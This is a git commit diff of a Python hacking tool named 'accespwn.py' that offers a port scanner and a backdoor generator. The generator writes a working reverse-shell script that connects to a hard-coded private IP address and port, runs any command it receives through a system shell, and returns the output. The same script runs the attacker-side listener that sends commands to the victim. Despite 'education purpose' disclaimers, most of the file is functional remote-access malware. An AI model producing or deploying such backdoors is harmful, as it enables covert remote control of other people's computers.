b04ea431800e67872bfb1d7bf26cb1eb5fbbf8e4
msfcode <74313566+msfcode@users.noreply.github.com>
2020-11-24 08:37:20 +0000

    Add files via upload

--- accespwn.py
+++ accespwn.py
@@ -1,21 +1,30 @@
 #!/bin/bash/env python3
 import os
 import sys
-import socket, subprocess as sp
-print("                                             Coded By @msfcode                     ")
-print("                                             exploits, Coffee                                  ")
-print("                                                KEEP-CALM")
-print("                                             They Watch YOU !!                      ")
-print("                                        \u001b[36mhttps://github.com/msfcode")
+import socket
+import time 
+import pyfiglet
+name = pyfiglet.figlet_format("AccesPwn")
+print(name+          'developped by msfcode' )
 print("")
 print("")
+print("")
+print("")
+print("                                             Coded By @msfcode                                 |====================")
+print("                                             exploits, Coffee                                  |   for education   |")
+print("                                                KEEP-CALM                                      | Ask a copyright(R)|")
+print("                                             They Watch YOU !!                                 |                   |")
+print("                                        \u001b[36mhttps://github.com/msfcode                   ")
+print("")
+print("                                                                                    \u001b[32mAttention:I'm Not responsable of your acts")
+print("                                                                                                 (Education Purpose)          ")
 print("")
 print("")
 print("                                                \u001b[31mAttacks ")
 print("")
-print("                                \u001b[37m1-Port Scanning          2-Backdoor ")
+print("                                \u001b[37m1-Port Scanning          2-Post Client")
 print("")
-number = int(input("Type the attack number>>"))
+number = int(input("Type the attack number>>")) 
 if number == 1:
   print("")
   print("")
@@ -32,46 +41,144 @@ if number == 1:
    print("\u001b[31mThe Port is closed")
   else: 
    print("\u001b[33mThe Port is opened")
-if number == 2:
-   print("")
-   print("              \u001b[36mA backdoor is a malware type that negates normal authentication procedures to access a system.") 
-   print("              As a result, remote access is granted to resources within an application,") 
-   print("              such as databases and file servers, giving perpetrators the ability to remotely") 
-   print("                            issue system commands and update malware.")
-   print("")
-   print("")
-   print("                                               BackDoor coded by @msfcode")
-   print("                                                     GET acces NOW !!")
-   print("                                             ONLY TO TEST YOUR SYSTEM SECURITY !!")
-   print("                                                  i'm Not Responsable ")
-   print("                       #GAiN_ACCESS  #add_files #remove_files #view_files #add_directory #delete_directory ")
+if number == 2: 
+   print("                                                      \u001b[33m/--------------------\                                                                                 ")
+   print("                                                     /     (>)     (<)      \                                                              ")
+   print("                                                    /         .   .          \                                                            ")
+   print("                                                   /                          \                                                           ")
+   print("                                                  /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\                                                                                     ")
+   print("                                                 |      \u001b[36mhacking is an art       \u001b[33m|                                          ")
+   print("                                                 \u001b[33m\         \u001b[36mis a life            \u001b[33m/                                            ")
+   print("                                                  \u001b[33m\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/                                                                     ")
+   print("                                                                                                                        ")
+   print("                                                        Author :  @msfcode                                                             ")
    print("")
    print("")
-   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-   host = "192.168.1.7"
-   port = 4444
-   s.bind((host,port))
-   print("                                      [*] The Server is Currently Running Dude", host)
    print("")
-   print("                                      [*] Waiting for any incomming connections...")
-   s.listen(1)
-   conn, addr = s.accept()
    print("")
-   print(addr, "[*] Connected to ", host)
+   print("                                                      [1] creat   [2] handler")
    print("")
-   while 1:
-     command = input("#> ")
-     if command != ("exit()"):
-       if command == "": continue
-       conn.send(command) 
-       result = conn.recev(1024)
-       total_size = long(result[:16])
-       result = result[16:]
-       while total_size > len(result):
-        data = conn.recev(1024)
-        result += data
-       else:
-        conn.send("exit()")
-        print("[*]Sorry,Dude try again...[*]")
-        break
+   print("")
+   print("")
+   print("")
+   number2 = int(input('Type the number>>'))
+   if number2 == 1:
+    name = input(str("Type Backdoor Name :"))
+    backdoor = open(name+'.py', 'w')
+    backdoor.write('''import os 
+import subprocess
+import os
+import sys
+import socket
+host = "192.168.1.10"
+port = 9999
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+while True:
+        data = s.recv(1024)
+        if data[:2].decode("utf-8") == 'cd':
+                os.chdir(data[3:].decode("utf-8")) 
+        if len(data) > 0: 
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_bytes, "utf-8") 
+                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                print(output_str) 
 s.close()
+''')
+    backdoor.close()
+    def creat_socket():
+       try:
+        global host 
+        global port
+        global s
+        host = "192.168.1.10"
+        port = 9999
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+       except:
+         print("[!]Sorry their is an error[!]")    
+
+
+    def s_bind():
+       try:
+         global host
+         global port
+         global s
+         s.bind((host, port))
+         s.listen(1)
+       except socket.error as msg:
+         print("[!]Their is an error try to fix it[!]")
+
+
+    def send_commands(conn):
+     while True:
+        cmd = input("command>>")
+        if cmd == 'quit':
+            s.close()
+            conn.close()
+            sys.close()
+        if len(str.encode(cmd)) > 0:
+         conn.send(str.encode(cmd))
+         client_data = str(conn.recv(1024), 'utf-8')    
+         print(client_data)     
+
+
+    def s_accept():
+     conn, addr = s.accept()
+     send_commands(conn)
+     conn.close()
+
+     
+    def main():
+     creat_socket()
+     s_bind()
+     s_accept()
+    main()
+   if number2 == 2:
+     def creat_socket():
+       try:
+        global host 
+        global port
+        global s
+        host = "192.168.1.10"
+        port = 9999
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+       except:
+         print("[!]Sorry their is an error[!]")    
+
+
+     def s_bind():
+       try:
+         global host
+         global port
+         global s
+         s.bind((host, port))
+         s.listen(1)
+       except socket.error as msg:
+         print("[!]Their is an error try to fix it[!]")
+
+
+     def send_commands(conn):
+      while True:
+        cmd = input("command>>")
+        if cmd == 'quit':
+            s.close()
+            conn.close()
+            sys.close()
+        if len(str.encode(cmd)) > 0:
+         conn.send(str.encode(cmd))
+         client_data = str(conn.recv(1024), 'utf-8')    
+         print(client_data)     
+
+
+     def s_accept():
+      conn, addr = s.accept()
+      send_commands(conn)
+      conn.close()
+
+     
+     def main():
+      creat_socket()
+      s_bind()
+      s_accept()
+     main()     
